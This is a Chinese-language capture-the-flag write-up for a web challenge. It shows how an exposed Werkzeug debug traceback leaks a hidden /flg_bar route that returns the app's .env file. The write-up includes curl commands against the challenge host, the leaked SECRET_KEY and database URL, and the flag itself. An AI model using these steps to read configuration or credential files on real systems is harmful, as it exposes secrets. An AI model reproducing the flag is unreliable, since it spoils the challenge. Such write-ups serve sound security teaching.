# Debug Disaster

## 题目信息

- 类型：Web
- 题目状态：已解出
- 目标：http://23.179.17.92:5002
- 核心漏洞：生产环境开启 Werkzeug Debugger，`/admin` 报错页泄露源码片段，暴露隐藏路由 `/flg_bar`，最终通过任意文件读取 `.env` 拿到 flag

## 入口与现象

首页只有一行欢迎语：

```html
<h2>Welcome to Startup Portal</h2>
```

常规路径里，`/admin` 很特别，访问后不是 404，而是直接报 500。题目描述里又明确提到“debug mode”可能没关，所以优先检查这个报错点。

抓到 `/admin` 的返回后，可以确认目标是 Flask/Werkzeug：

```http
HTTP/1.1 500 INTERNAL SERVER ERROR
Server: Werkzeug/3.1.8 Python/3.11.15
```

同时页面就是完整的 Werkzeug Debugger traceback，不只是普通 500。

## 分析过程

`/admin` 的报错页直接泄露了应用源码片段：

```python
@app.route("/admin")
def admin():
    raise Exception("Debug leak triggered: Dirbuster maybe in your future!")

@app.route("/flg_bar")
def env():
    return open(".env").read(), 200, {"Content-Type": "text/plain"}
```

这里已经足够了，关键信息有两个：

1. 生产环境确实开着 Werkzeug Debugger，导致 traceback 可见。
2. traceback 直接把隐藏路由 `/flg_bar` 泄露出来了，而且这个路由会读取当前目录下的 `.env`。

因此不需要再去想办法解 PIN 进入交互式 console，也不需要继续打别的漏洞，直接访问 `/flg_bar` 即可。

## 利用过程

1. 访问首页，确认站点是个很简陋的 Flask 应用。
2. 枚举常见路径时发现 `/admin` 返回 500。
3. 打开 `/admin` 的 debug 页面，看到 traceback 中泄露的源码。
4. 从源码里发现隐藏路由 `/flg_bar`，其逻辑为 `open(".env").read()`。
5. 访问 `/flg_bar`，直接读取 `.env`，拿到 flag。

实际回显如下：

```text
SECRET_KEY=supersecret
FLAG=CIT{H1dd3n_D1r5_3v3rywh3r3}
DATABASE_URL=sqlite:///prod.db
```

## 关键 payload / 命令

```powershell
curl.exe -i http://23.179.17.92:5002/admin

curl.exe -i http://23.179.17.92:5002/flg_bar
```

关键利用点就是 `/admin` 返回的 traceback 中这段源码：

```python
@app.route("/flg_bar")
def env():
    return open(".env").read(), 200, {"Content-Type": "text/plain"}
```

## Flag

```text
CIT{H1dd3n_D1r5_3v3rywh3r3}
```

## 总结

这题的核心不是利用 Werkzeug console RCE，而是先利用 debug 模式带来的 traceback 泄露源码，再从源码中找到被“藏起来”的敏感路由。开发者除了没关 debug，还把读取 `.env` 的功能直接挂在了路由上，最终导致 flag 被一步读出。
